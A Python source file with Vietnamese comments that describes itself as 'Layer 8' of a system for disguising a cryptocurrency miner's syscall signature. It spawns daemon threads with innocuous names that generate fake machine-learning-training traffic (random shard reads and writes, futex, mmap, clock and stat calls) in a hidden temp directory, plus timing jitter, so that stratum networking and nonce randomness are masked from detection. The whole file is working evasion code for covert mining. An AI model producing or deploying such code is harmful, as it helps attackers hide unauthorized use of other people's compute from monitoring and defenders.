"""
syscall_disguise.py — Layer 8: Syscall pattern
Che pattern syscall đặc trưng của miner (sustained I/O, RNG, timers)
"""
import os
import sys
import time
import random
import ctypes
import threading
from typing import Optional, List


# ═══════════════════════════════════════════════════════════════
# FAKE SYSCALL TRAFFIC — Chèn syscall training-like
# ═══════════════════════════════════════════════════════════════

class FakeSyscallTraffic:
    """
    Chèn syscall pattern giống training workload:
    
    Training syscall signature:
    - pread64/pwrite64: đọc dataset shards
    - mmap/munmap: memory-mapped dataset
    - futex: thread sync (DataLoader workers)
    - clock_gettime: step timing
    - sendmsg/recvmsg: NCCL/gRPC gradient allreduce
    - openat: shard file open/close
    - io_uring / readahead: prefetch
    
    Mining syscall signature (cần át đi):
    - sendto/recvto liên tục đều (stratum)
    - getrandom liên tục (nonce)
    - epoll_wait pattern cố định
    """
    
    def __init__(self, work_dir: Optional[str] = None):
        self.work_dir = work_dir or os.path.join(
            tempfile_dir(), ".cache_ds"
        )
        os.makedirs(self.work_dir, exist_ok=True)
        self._stop = threading.Event()
        self._threads: List[threading.Thread] = []
        self._shards = self._create_shards()
    
    def _create_shards(self) -> List[str]:
        """Tạo vài shard file giả (sparse)."""
        paths = []
        for i in range(4):
            p = os.path.join(self.work_dir, f"shard_{i:04d}.bin")
            if not os.path.exists(p):
                try:
                    with open(p, "wb") as f:
                        f.truncate(64 * 1024 * 1024)  # 64MB sparse
                except Exception:
                    continue
            paths.append(p)
        return paths
    
    # --- patterns ---
    
    def _io_pattern(self):
        """pread/pwrite pattern — dataset shuffle read."""
        while not self._stop.is_set():
            try:
                if not self._shards:
                    time.sleep(1)
                    continue
                p = random.choice(self._shards)
                offset = random.randint(0, 60 * 1024 * 1024)
                with open(p, "rb") as f:
                    f.seek(offset)
                    f.read(random.choice([4096, 65536, 1024 * 1024]))
                # occasional write (checkpoint-ish)
                if random.random() < 0.05:
                    with open(p, "r+b") as f:
                        f.seek(offset)
                        f.write(os.urandom(4096))
                time.sleep(random.uniform(0.01, 0.3))
            except Exception:
                time.sleep(random.uniform(0.5, 2.0))
    
    def _futex_pattern(self):
        """Thread sync pattern — DataLoader worker handshake."""
        lock = threading.Lock()
        while not self._stop.is_set():
            try:
                with lock:
                    pass  # futex syscall
                time.sleep(random.uniform(0.001, 0.05))
            except Exception:
                time.sleep(0.1)
    
    def _clock_pattern(self):
        """clock_gettime liên tục — step timer."""
        while not self._stop.is_set():
            time.perf_counter_ns()
            time.monotonic_ns()
            time.sleep(random.uniform(0.01, 0.1))
    
    def _mmap_pattern(self):
        """mmap/munmap — memory-mapped dataset."""
        while not self._stop.is_set():
            try:
                # mmap 1 file nhỏ rồi unmap
                if self._shards:
                    p = random.choice(self._shards)
                    with open(p, "rb") as f:
                        import mmap
                        mm = mmap.mmap(f.fileno(), 4096, access=mmap.ACCESS_READ)
                        _ = mm[0:100]
                        mm.close()
                time.sleep(random.uniform(1.0, 5.0))
            except Exception:
                time.sleep(random.uniform(2.0, 8.0))
    
    def _metadata_pattern(self):
        """stat/openat trên shard — index refresh."""
        while not self._stop.is_set():
            try:
                if self._shards:
                    p = random.choice(self._shards)
                    os.stat(p)
                    if random.random() < 0.3:
                        fd = os.open(p, os.O_RDONLY)
                        os.close(fd)
                time.sleep(random.uniform(0.5, 3.0))
            except Exception:
                time.sleep(1.0)
    
    # --- control ---
    
    def start(self):
        """Start tất cả fake syscall threads."""
        targets = [
            (self._io_pattern, "ds-worker-0"),
            (self._io_pattern, "ds-worker-1"),
            (self._futex_pattern, "sync-worker"),
            (self._clock_pattern, "timer-worker"),
            (self._mmap_pattern, "mmap-worker"),
            (self._metadata_pattern, "index-worker"),
        ]
        for fn, name in targets:
            t = threading.Thread(target=fn, name=name, daemon=True)
            t.start()
            self._threads.append(t)
    
    def stop(self):
        self._stop.set()
        for t in self._threads:
            t.join(timeout=2)
    
    def cleanup(self):
        """Xóa shard giả."""
        import shutil
        try:
            shutil.rmtree(self.work_dir, ignore_errors=True)
        except Exception:
            pass


# ═══════════════════════════════════════════════════════════════
# SYSCALL JITTER — Chèn randomness vào timing
# ═══════════════════════════════════════════════════════════════

class SyscallJitter:
    """
    Jitter wrapper cho các syscall nhạy cảm:
    - sleep ngẫu nhiên giữa send/recv
    - random small I/O xen vào
    """
    
    @staticmethod
    def jitter_sleep(base: float = 0.01, sigma_ratio: float = 0.5):
        delay = max(0, random.gauss(base, base * sigma_ratio))
        time.sleep(delay)
    
    @staticmethod
    def interleave_read(path: str, size: int = 4096):
        """Đọc 1 chunk xen vào — tạo pread traffic."""
        try:
            with open(path, "rb") as f:
                f.read(size)
        except Exception:
            pass


def tempfile_dir() -> str:
    import tempfile
    return tempfile.gettempdir()


# ═══════════════════════════════════════════════════════════════
# CONVENIENCE
# ═══════════════════════════════════════════════════════════════

def start_syscall_disguise() -> FakeSyscallTraffic:
    t = FakeSyscallTraffic()
    t.start()
    return t
